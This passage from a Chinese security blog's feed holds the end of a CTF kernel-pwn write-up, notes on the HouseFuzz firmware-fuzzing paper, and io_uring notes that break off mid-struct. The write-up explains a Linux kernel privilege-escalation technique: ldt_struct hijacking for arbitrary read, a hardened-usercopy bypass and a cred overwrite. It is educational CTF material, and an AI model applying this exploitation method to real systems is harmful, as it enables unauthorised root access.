class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">int</span>)ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>系统调用应传入三个参数：func, ptr, bytecount ，ptr为指向 user_desc 结构体的指针。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_desc</span> &#123;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span>  entry_number;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span>  base_addr;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span>  limit;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span>  seg_32bit:<span class="number">1</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span>  contents:<span class="number">2</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span>  read_exec_only:<span class="number">1</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span>  limit_in_pages:<span class="number">1</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span>  seg_not_present:<span class="number">1</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span>  useable:<span class="number">1</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h4 id="read-ldt：内核任意地址读"><a href="#read-ldt：内核任意地址读" class="headerlink" title="read_ldt：内核任意地址读"></a>read_ldt：内核任意地址读</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">read_ldt</span><span class="params">(<span class="type">void</span> __user *ptr, <span class="type">unsigned</span> <span class="type">long</span> bytecount)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">    <span class="keyword">if</span> (copy_to_user(ptr, mm-&gt;context.ldt-&gt;entries, entries_size)) &#123;</span><br><span class="line">        retval = -EFAULT;</span><br><span class="line">        <span class="keyword">goto</span> out_unlock;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">out_unlock:</span><br><span class="line">    up_read(&amp;mm-&gt;context.ldt_usr_sem);</span><br><span class="line">    <span class="keyword">return</span> retval;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>调用 copy_to_user 向用户地址拷贝数据，如果可以控制 ldt-&gt;entries 即可完成任意地址读。</p>
<h4 id="write-ldt：分配新-ldt-struct-结构体"><a href="#write-ldt：分配新-ldt-struct-结构体" class="headerlink" title="write_ldt：分配新 ldt_struct 结构体"></a>write_ldt：分配新 ldt_struct 结构体</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">write_ldt</span><span class="params">(<span class="type">void</span> __user *ptr, <span class="type">unsigned</span> <span class="type">long</span> bytecount, <span class="type">int</span> oldmode)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    error = -EINVAL;</span><br><span class="line">    <span class="keyword">if</span> (bytecount != <span class="keyword">sizeof</span>(ldt_info))</span><br><span class="line">        <span class="keyword">goto</span> out;</span><br><span class="line">    error = -EFAULT;</span><br><span class="line">    <span class="keyword">if</span> (copy_from_user(&amp;ldt_info, ptr, <span class="keyword">sizeof</span>(ldt_info)))</span><br><span class="line">        <span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">    error = -EINVAL;</span><br><span class="line">    <span class="keyword">if</span> (ldt_info.entry_number &gt;= LDT_ENTRIES)</span><br><span class="line">        <span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">    old_ldt       = mm-&gt;context.ldt;</span><br><span class="line">    old_nr_entries = old_ldt ? old_ldt-&gt;nr_entries : <span class="number">0</span>;</span><br><span class="line">    new_nr_entries = max(ldt_info.entry_number + <span class="number">1</span>, old_nr_entries);</span><br><span class="line"></span><br><span class="line">    error = -ENOMEM;</span><br><span class="line">    new_ldt = alloc_ldt_struct(new_nr_entries);</span><br><span class="line">    <span class="keyword">if</span> (!new_ldt)</span><br><span class="line">        <span class="keyword">goto</span> out_unlock;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (old_ldt)</span><br><span class="line">        <span class="built_in">memcpy</span>(new_ldt-&gt;entries, old_ldt-&gt;entries, old_nr_entries * LDT_ENTRY_SIZE);</span><br><span class="line"></span><br><span class="line">    new_ldt-&gt;entries[ldt_info.entry_number] = ldt;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">    install_ldt(mm, new_ldt);</span><br><span class="line">    unmap_ldt_struct(mm, old_ldt);</span><br><span class="line">    free_ldt_struct(old_ldt);</span><br><span class="line">    error = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">out_unlock:</span><br><span class="line">    up_write(&amp;mm-&gt;context.ldt_usr_sem);</span><br><span class="line">out:</span><br><span class="line">    <span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>会调用 alloc_ldt_struct 函数来分配新的 ldt_struct 结构体并 copy 原数据到新的结构体内。<br>alloc_ldt_struct 函数如下，使用 kmalloc 分配，flag 为 GFP_KERNEL：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* The caller must call finalize_ldt_struct on the result. LDT starts zeroed. */</span></span><br><span class="line"><span class="type">static</span> <span class="keyword">struct</span> ldt_struct *<span class="title function_">alloc_ldt_struct</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> num_entries)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ldt_struct</span> *<span class="title">new_ldt</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> alloc_size;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (num_entries &gt; LDT_ENTRIES)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    new_ldt = kmalloc(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> ldt_struct), GFP_KERNEL);</span><br><span class="line"><span class="comment">//...</span></span><br></pre></td></tr></table></figure>
<p>因此解题思路如下：</p>
<ul>
<li>构造 UAF</li>
<li>通过 write_ldt 申请回该对象为 ldt_struct</li>
<li>通过 note 修改 ldt_struct-&gt;entries 来实现任意地址读</li>
<li>通过 read_ldt 搜索内核地址空间。</li>
</ul>
<h4 id="解法1：遍历内存修改进程-cred-提权"><a href="#解法1：遍历内存修改进程-cred-提权" class="headerlink" title="解法1：遍历内存修改进程 cred 提权"></a>解法1：遍历内存修改进程 cred 提权</h4><h5 id="Step1-泄漏-page-offset-base"><a href="#Step1-泄漏-page-offset-base" class="headerlink" title="Step1. 泄漏 page_offset_base"></a>Step1. 泄漏 page_offset_base</h5><p>由于开启 kaslr, 需要泄漏相关地址，这里我们选择直接爆破内核地址：对于无效地址，copy_to_user 会返回非0值，此时 read_ldt 会返回 -EFAULT，当执行成功时，说明命中内核空间。<br>不过该题开启了 HARDENED USERCOPY 保护，当 copy_to_user 源地址为内核 .text 段时会引起 kernel panic。因此这里选择直接搜索 线性映射区。也是 task_struct 所在的区域。只需要修改本进程的 task_struct ，更改 cred 的 uid 为0，即可实现提权。</p>
<blockquote>
<p>kmalloc 会从 线性映射区中分配，但是 vmalloc 不会，其从 vmalloc&#x2F;ioremap space 中分配内存，起始地址为 vmalloc_base，这一块区域与物理地址的映射不连续。</p>
</blockquote>
<h5 id="Step2-泄漏进程-task-struct-地址"><a href="#Step2-泄漏进程-task-struct-地址" class="headerlink" title="Step2. 泄漏进程 task_struct 地址"></a>Step2. 泄漏进程 task_struct 地址</h5><p>task_struct 源码如下，comm 字段为进程名字，因此可以通过搜索该字符串来定位进程的 task_struct 所在位置（可以通过 prctl 系统调用来修改 当前进程的 comm 字段）：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> &#123;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Process credentials: */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Tracer&#x27;s credentials at attach: */</span></span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>        *<span class="title">ptracer_cred</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Objective and real subjective task credentials (COW): */</span></span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>        *<span class="title">real_cred</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Effective (overridable) subjective task credentials (COW): */</span></span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>        *<span class="title">cred</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">    <span class="comment">/* Cached requested key. */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span>            *<span class="title">cached_requested_key</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * executable name, excluding path.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * - normally initialized setup_new_exec()</span></span><br><span class="line"><span class="comment">     * - access it with [gs]et_task_comm()</span></span><br><span class="line"><span class="comment">     * - lock it with task_lock()</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">char</span>                comm[TASK_COMM_LEN];</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">nameidata</span>        *<span class="title">nameidata</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>这里不能直接搜索整个线性映射区，因为可能会触发 hardened usercopy 检查。<br>这里使用官方提供的解法，利用 fork 函数的 clone ldt 的特性来绕过该检查。</p>
<figure class="highlight scss"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sys_fork</span>()</span><br><span class="line">    <span class="built_in">kernel_clone</span>()</span><br><span class="line">        <span class="built_in">copy_process</span>()</span><br><span class="line">            <span class="built_in">copy_mm</span>()</span><br><span class="line">                <span class="built_in">dup_mm</span>()</span><br><span class="line">                    <span class="built_in">dup_mmap</span>()</span><br><span class="line">                        <span class="built_in">arch_dup_mmap</span>()</span><br><span class="line">                            <span class="built_in">ldt_dup_context</span>()</span><br></pre></td></tr></table></figure>
<p>ldt_dup_context 函数定义中使用 memcpy 拷贝父进程的 ldt-&gt;entries 到子进程。（这里有一个小 trick 在，本来是 篡改 的 entries 指针来搜索，memcpy 后，就是在合法的 entries 中查看了）</p>
<h5 id="Step3-Double-Fetch-修改-cred-结构体"><a href="#Step3-Double-Fetch-修改-cred-结构体" class="headerlink" title="Step3. Double Fetch 修改 cred 结构体"></a>Step3. Double Fetch 修改 cred 结构体</h5><p>在 write_ldt 中，会通过 memcpy 进行拷贝，拷贝大小为 <code>old_nr_entries * LDT_ENTRY_SIZE</code>，</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Maximum number of LDT entries supported. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LDT_ENTRIES    8192</span></span><br><span class="line"><span class="comment">/* The size of each LDT entry. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LDT_ENTRY_SIZE    8</span></span><br></pre></td></tr></table></figure>
<p>需要在 alloc 后 memcpy 前进行条件竞争，将 new_ldt-&gt;entries 修改为目标地址来实现任意地址写。<br>当然，因为分配的是 kmalloc-32 ，也可以通过 seq_operations 进行利用。</p>
<h4 id="解法2：使用-pt-regs-seq-operations-利用"><a href="#解法2：使用-pt-regs-seq-operations-利用" class="headerlink" title="解法2：使用 pt_regs + seq_operations 利用"></a>解法2：使用 pt_regs + seq_operations 利用</h4><ul>
<li>劫持 ldt_struct 爆破 page_offset_base</li>
<li>进而泄露内核代码段基址（ page_offset_base + 0x9d000）</li>
<li>劫持 seq_operations + pt_regs</li>
</ul>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
<li><a href="https://arttnba3.cn/2021/10/31/CTF-0X05-TCTF2021_FINAL/#%E8%A7%A3%E6%B3%95%E4%BA%8C%EF%BC%9A%E5%8A%AB%E6%8C%81-seq-operations-%E5%88%A9%E7%94%A8-pt-regs-%E8%BF%9B%E8%A1%8C-ROP-%E5%AE%8C%E6%88%90%E7%A8%B3%E5%AE%9A%E5%8C%96%E6%8F%90%E6%9D%83">【CTF.0x05】TCTF2021-FINAL 两道 kernel pwn 题解 _</a></li>
<li><a href="https://github.com/YZloser/My-CTF-Challenges/tree/master/0ctf-2021-final/kernote">Writeup for kernote in 0CTF&#x2F;TCTF Final 2021</a></li>
</ul>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
  </entry>
  <entry>
    <title>HouseFuzz论文笔记</title>
    <url>/posts/983eb53f.html</url>
    <content><![CDATA[<h2 id="论文简介"><a href="#论文简介" class="headerlink" title="论文简介"></a>论文简介</h2><p>论文题目：HouseFuzz: Service-Aware Grey-Box Fuzzing for Vulnerability Detection in Linux-Based Firmware<br>论文作者：<a href="https://ieeexplore.ieee.org/author/37089464685">Haoyu Xiao</a>; <a href="https://ieeexplore.ieee.org/author/37089662322">Ziqi Wei</a>; <a href="https://ieeexplore.ieee.org/author/37086360811">Jiarun Dai</a>; <a href="https://ieeexplore.ieee.org/author/604017425961980">Bowen Li</a>; <a href="https://ieeexplore.ieee.org/author/37089915943">Yuan Zhang</a>; <a href="https://ieeexplore.ieee.org/author/37086558729">Min Yang</a><br>机构&#x2F;高校：Fudan University</p>
<p>该工作提出了一个针对 linux 固件的用户态模拟模糊测试方案</p>
<h2 id="技术路线"><a href="#技术路线" class="headerlink" title="技术路线"></a>技术路线</h2><img src="/posts/983eb53f/file-20251110164233243.png" class="">
<p>分为三个部分：</p>
<ul>
<li>服务进程定位与模拟</li>
<li>协议字段关键字提取与种子生成</li>
<li>多进程模糊测试框架构建</li>
</ul>
<h3 id="服务进程定位与模拟"><a href="#服务进程定位与模拟" class="headerlink" title="服务进程定位与模拟"></a>服务进程定位与模拟</h3><p>作者将服务进程分为了三个类型：网络进程，守护进程，工具进程。网络进程负责提供对外部的端口服务；守护进程开启本地的端口服务，负责给网络进程提供 IPC 通信；工具进程由网络进程 fork 用于单个请求的处理。</p>
<h4 id="网络进程定位"><a href="#网络进程定位" class="headerlink" title="网络进程定位"></a>网络进程定位</h4><p>首先其根据系统初始化脚本借用 GreenHouse 的 patch-run-loop 思路去运行系统初始化脚本 init，然后在此过程进行插桩检测启动的网络服务，例如 bind() 系统调用，然后再根据 execve() 系统调用提取出其模拟的参数。</p>
<h4 id="守护进程识别"><a href="#守护进程识别" class="headerlink" title="守护进程识别"></a>守护进程识别</h4><p>首先通过动态跟踪方法识别 IPC 的特征 key（例如文件路径）来确定是否存在 IPC 通道。然后确定网络服务的依赖 IPC 来确定守护进程（通过 recv, send 这些系统调用对应的 socket 来定位识别），然后就是提取其启动的命令了</p>
<h4 id="进程模拟"><a href="#进程模拟" class="headerlink" title="进程模拟"></a>进程模拟</h4><p>基于 GreenHouse 工作来实现用户模拟。</p>
<h3 id="多进程模糊测试框架"><a href="#多进程模糊测试框架" class="headerlink" title="多进程模糊测试框架"></a>多进程模糊测试框架</h3><p>主要体现在两个方面：多进程的代码覆盖率统计；多进程的漏洞检测</p>
<h4 id="多进程覆盖率"><a href="#多进程覆盖率" class="headerlink" title="多进程覆盖率"></a>多进程覆盖率</h4><blockquote>
<p>代码覆盖率统计分为三个步骤：记录测试用例在执行过程中的代码覆盖信息；检测测试用例的执行是否结束；基于收集的代码覆盖率信息判断测试用例是否是有价值的</p>
</blockquote>
<h5 id="覆盖率统计的执行过程范围"><a href="#覆盖率统计的执行过程范围" class="headerlink" title="覆盖率统计的执行过程范围"></a>覆盖率统计的执行过程范围</h5><p>在多进程的情况下，判断测试用例的执行是否结束是需要考虑的，作者针对三个不同进程提出了不同的判断逻辑：</p>
<ul>
<li>工具进程：是否运行退出，与单进程模糊测试类似</li>
<li>网络进程：是否释放了建立的 socket 连接，即 close();</li>
<li>守护进程：在前两个进程结束后，检测守护进程是否在进行 I&#x2F;O 监听<br>与之对应的多进程服务执行状态图对应如下：<img src="/posts/983eb53f/file-20251110170130737.png" class=""></li>
</ul>
<h5 id="覆盖率记录"><a href="#覆盖率记录" class="headerlink" title="覆盖率记录"></a>覆盖率记录</h5><p>为每一个进程单独分配一个覆盖率 bitmap，到最后进行合并。<br>这里对于守护进程，其采取的策略是仅当守护进程调用 accept 系统调用时，才会去记录其覆盖率信息。</p>
<h5 id="覆盖率反馈"><a href="#覆盖率反馈" class="headerlink" title="覆盖率反馈"></a>覆盖率反馈</h5><p>当 bitmap 有新的覆盖，则视作好种子。<br>有一个问题是：运行启动的进程在测试过程中可能会发生变化（启动了不同的程序或者以不同的顺序启动）然后，该工作会将bitmap与每一个elf🔗起来。</p>
<h4 id="多进程漏洞检测"><a href="#多进程漏洞检测" class="headerlink" title="多进程漏洞检测"></a>多进程漏洞检测</h4><p>检测内存型漏洞以及命令注入漏洞<br>命令注入漏洞似乎是在 execve 系统调用处作插桩，如果发生语法错误就令其 segment fault （由于命令注入以及 fuzz 的本身特性，所以这个是合理的）。</p>
<h3 id="协议模糊测试方法"><a href="#协议模糊测试方法" class="headerlink" title="协议模糊测试方法"></a>协议模糊测试方法</h3><h4 id="服务协议形式化"><a href="#服务协议形式化" class="headerlink" title="服务协议形式化"></a>服务协议形式化</h4><p>作者采用了 CFG (Context-Free Grammer) 以及 TDG (Token Dependent Graph) 策略来进行测试种子的生成。<br>TDG 的大致样式如下，大致就是给程序中的相关字符串打上 PATH, KEY, VALUE 的标签，然后还会做数据流和控制流依赖分析从而建立图结构：</p>
<img src="/posts/983eb53f/file-20251110171434598.png" class="">
<p>后续根据 CFG 以及 TDG 生成测试用例，当然也会采取 Random 的变异策略</p>
<h2 id="实验评估"><a href="#实验评估" class="headerlink" title="实验评估"></a>实验评估</h2><p>该工作有两个数据集，一个是比较旧的，用于与其他工作的对比（60个固件）。另一个为20年后，用于测试漏洞挖掘能力（12个固件）<br>该工作实现上是基于 GreenHouse, QEMU, AFL++, Radare2, IDA PRO。</p>
<h4 id="模糊测试性能对比"><a href="#模糊测试性能对比" class="headerlink" title="模糊测试性能对比"></a>模糊测试性能对比</h4><p>这里可以看到 HouseFuzz 的覆盖率是稍微高于 GreenHouse 的，然后其仅统计了网络进程；漏洞方面也是除去了命令注入漏洞。</p>
<img src="/posts/983eb53f/file-20251110171957603.png" class="">

<h4 id="服务识别对比"><a href="#服务识别对比" class="headerlink" title="服务识别对比"></a>服务识别对比</h4><p>与 FirmAE, GreenHouse 进行对比：</p>
<img src="/posts/983eb53f/file-20251110172233760.png" class="">
<h4 id="守护进程识别对比"><a href="#守护进程识别对比" class="headerlink" title="守护进程识别对比"></a>守护进程识别对比</h4><p>GreenHouse 和 HouseFuzz 都实现了对所有守护进程的识别</p>
<h4 id="多进程模糊测试框架实验"><a href="#多进程模糊测试框架实验" class="headerlink" title="多进程模糊测试框架实验"></a>多进程模糊测试框架实验</h4><h5 id="消融实验"><a href="#消融实验" class="headerlink" title="消融实验"></a>消融实验</h5><img src="/posts/983eb53f/file-20251110172408078.png" class="">
<img src="/posts/983eb53f/file-20251110172440530.png" class="">
<h5 id="。。。（其余的先🕊了）"><a href="#。。。（其余的先🕊了）" class="headerlink" title="。。。（其余的先🕊了）"></a>。。。（其余的先🕊了）</h5><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
<li><a href="https://ieeexplore.ieee.org/document/11023421">https://ieeexplore.ieee.org/document/11023421</a></li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>io uring学习</title>
    <url>/posts/2fffd89e.html</url>
    <content><![CDATA[<h2 id="基本结构"><a href="#基本结构" class="headerlink" title="基本结构"></a>基本结构</h2><p>io_uring 结构为两个单向环形队列，分为 Submission Queue (SQ) 和 Completion Queue (CQ) ：</p>
<img src="/posts/2fffd89e/ndC5PxfNhbZa8Gv.png" class="" title="image.png">

<p>内核中使用 io_uring 结构体来保存单个环形队列的 head 和 tail, head 用于出列，tail 用于入列。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_uring</span> &#123;</span></span><br><span class="line">	u32 head;</span><br><span class="line">	u32 tail;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>io_uring_sqe 结构体用于表示提交的请求 (Submission Queue Entry)。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * IO submission data structure (Submission Queue Entry)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_uring_sqe</span> &#123;</span></span><br><span class="line">	__u8	opcode;		<span class="comment">/* type of operation for this sqe */</span></span><br><span class="line">	__u8	flags;		<span class="comment">/* IOSQE_ flags */</span></span><br><span class="line">	__u16	ioprio;		<span class="comment">/* ioprio for the request */</span></span><br><span class="line">	__s32	fd;		<span class="comment">/* file descriptor to do IO on */</span></span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		__u64	off;	<span class="comment">/* offset into file */</span></span><br><span class="line">		__u64	addr2;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">			__u32	cmd_op;</span><br><span class="line">			__u32	__pad1;</span><br><span class="line">		&#125;;</span><br><span class="line">	&#125;;</span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		__u64	addr;	<span class="comment">/* pointer to buffer or iovecs */</span></span><br><span class="line">		__u64	splice_off_in;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">			__u32	level;</span><br><span class="line">			__u32	optname;</span><br><span class="line">		&#125;;</span><br><span class="line">	&#125;;</span><br><span class="line">	__u32	len;		<span class="comment">/* buffer size or number of iovecs */</span></span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		__u32		rw_flags;</span><br><span class="line">		__u32		fsync_flags;</span><br><span class="line">		__u16		poll_events;	<span class="comment">/* compatibility */</span></span><br><span class="line">		__u32		poll32_events;	<span class="comment">/* word-reversed for BE */</span></span><br><span class="line">		__u32		sync_range_flags;</span><br><span class="line">		__u32		msg_flags;</span><br><span class="line">		__u32		timeout_flags;</span><br><span class="line">		__u32		accept_flags;</span><br><span class="line">		__u32		cancel_flags;</span><br><span class="line">		__u32		open_flags;</span><br><span class="line">		__u32		statx_flags;</span><br><span class="line">		__u32		fadvise_advice;</span><br><span class="line">		__u32		splice_flags;</span><br><span class="line">		__u32		rename_flags;</span><br><span class="line">		__u32		unlink_flags;</span><br><span class="line">		__u32		hardlink_flags;</span><br><span class="line">		__u32		xattr_flags;</span><br><span class="line">		__u32		msg_ring_flags;</span><br><span class="line">		__u32		uring_cmd_flags;</span><br><span class="line">		__u32		waitid_flags;</span><br><span class="line">		__u32		futex_flags;</span><br><span class="line">		__u32		install_fd_flags;</span><br><span class="line">		__u32		nop_flags;</span><br><span class="line">		__u32		pipe_flags;</span><br><span class="line">	&#125;;</span><br><span class="line">	__u64	user_data;	<span class="comment">/* data to be passed back at completion time */</span></span><br><span class="line">	<span class="comment">/* pack this to avoid bogus arm OABI complaints */</span></span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="comment">/* index into fixed buffers, if used */</span></span><br><span class="line">		__u16	buf_index;</span><br><span class="line">		<span class="comment">/* for grouped buffer selection */</span></span><br><span class="line">		__u16	buf_group;</span><br><span class="line">	&#125; __attribute__((packed));</span><br><span class="line">	<span class="comment">/* personality to use, if used */</span></span><br><span class="line">	__u16	personality;</span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		__s32	splice_fd_in;</span><br><span class="line">		__u32	file_index;</span><br><span class="line">		__u32	zcrx_ifq_idx;</span><br><span class="line">		__u32	optlen;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">			__u16	addr_len;</span><br><span class="line">			__u16	__pad3[<span class="number">1</span>];</span><br><span class="line">		&#125;;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">			__u8	write_stream;</span><br><span class="line">			__u8	__pad4[<span class="number">3</span>];</span><br><span class="line">		&#125;;</span><br><span class="line">	&#125;;</span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">			__u64	addr3;</span><br><span class="line">			__u64	__pad2[<span class="number">1</span>];</span><br><span class="line">		&#125;;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">			__u64	attr_ptr; <span class="comment">/* pointer to attribute information */</span></span><br><span class="line">			__u64	attr_type_mask; <span class="comment">/* bit mask of attributes */</span></span><br><span class="line">		&#125;;</span><br><span class="line">		__u64	optval;</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * If the ring is initialized with IORING_SETUP_SQE128, then</span></span><br><span class="line"><span class="comment">		 * this field is used for 80 bytes of arbitrary command data</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		__u8	cmd[<span class="number">0</span>];</span><br><span class="line">	&#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>io_uring_cqe 结构体表示完成的请求 （Completion Queue Entry）</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * IO completion data structure (Completion Queue Entry)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_uring_cqe</span> &#123;</span></span><br><span class="line">	__u64	user_data;	<span class="comment">/* sqe-&gt;user_data value passed back */</span></span><br><span class="line">	__s32	res;		<span class="comment">/* result code for this event */</span></span><br><span class="line">	__u32	flags;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * If the ring is initialized with IORING_SETUP_CQE32, then this field</span></span><br><span class="line"><span class="comment">	 * contains 16-bytes of padding, doubling the size of the CQE.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	__u64 big_cqe[];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>内核中实际会使用 io_rings 结构体存储相应的数据，其中封装了 io_uring、 提交队列 sq、结果队列 cq、cqe 数组</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * This data is shared with the application through the mmap at offsets</span></span><br><span class="line"><span class="comment"> * IORING_OFF_SQ_RING and IORING_OFF_CQ_RING.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The offsets to the member fields are published through struct</span></span><br><span class="line"><span class="comment"> * io_sqring_offsets when calling io_uring_setup.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_rings</span> &#123;</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Head and tail offsets into the ring; the offsets need to be</span></span><br><span class="line"><span class="comment">	 * masked to get valid indices.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * The kernel controls head of the sq ring and the tail of the cq ring,</span></span><br><span class="line"><span class="comment">	 * and the application controls tail of the sq ring and the head of the</span></span><br><span class="line"><span class="comment">	 * cq ring.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">io_uring</span>		<span class="title">sq</span>, <span class="title">cq</span>;</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Bitmasks to apply to head and tail offsets (constant, equals</span></span><br><span class="line"><span class="comment">	 * ring_entries - 1)</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	u32			sq_ring_mask, cq_ring_mask;</span><br><span class="line">	<span class="comment">/* Ring sizes (constant, power of 2) */</span></span><br><span class="line">	u32			sq_ring_entries, cq_ring_entries;</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Number of invalid entries dropped by the kernel due to</span></span><br><span class="line"><span class="comment">	 * invalid index stored in array</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * Written by the kernel, shouldn&#x27;t be modified by the</span></span><br><span class="line"><span class="comment">	 * application (i.e. get number of &quot;new events&quot; by comparing to</span></span><br><span class="line"><span class="comment">	 * cached value).</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * After a new SQ head value was read by the application this</span></span><br><span class="line"><span class="comment">	 * counter includes all submissions that were dropped reaching</span></span><br><span class="line"><span class="comment">	 * the new SQ head (and possibly more).</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	u32			sq_dropped;</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Runtime SQ 